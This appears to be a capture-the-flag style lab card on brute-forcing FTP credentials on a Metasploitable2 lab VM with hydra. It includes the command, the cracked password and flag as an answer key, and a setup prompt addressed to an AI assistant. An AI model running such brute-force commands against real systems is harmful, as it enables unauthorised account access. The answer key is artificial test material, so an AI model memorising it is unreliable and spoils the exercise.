# Q096 — Hydra FTP Bruteforce

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — Credential Attacks |
| **Difficulty** | 🟡 Medium |
| **Tools** | `hydra` |
| **Time budget** | 10–20 min |

---

## 📝 Question

Use hydra to brute FTP on Metasploitable for user `user` with rockyou. Report cracked password.

---

## 🎯 Flag Format

```
ftp_pass=<word>
```

Example: `ftp_pass=user`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`hydra -l user -P rockyou.txt ftp://<ip>`
</details>

<details>
<summary>Hint 2</summary>

Metasploitable user account password = user.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
hydra -l user -P /usr/share/wordlists/fasttrack.txt ftp://192.168.52.129
```

Cracks `user:user`.

**Answer:** `ftp_pass=user`

📖 Ref: [tools/hydra.md](../../tools/hydra.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q096:
1. Verify Metasploitable2 up; vsftpd running.
2. user 'user' with password 'user' exists by default on Metasploitable2.
3. fasttrack.txt available: ls /usr/share/wordlists/fasttrack.txt.

Report back: "Lab ready for Q096 — FTP 21 open, user:user account exists, hydra ready".
```
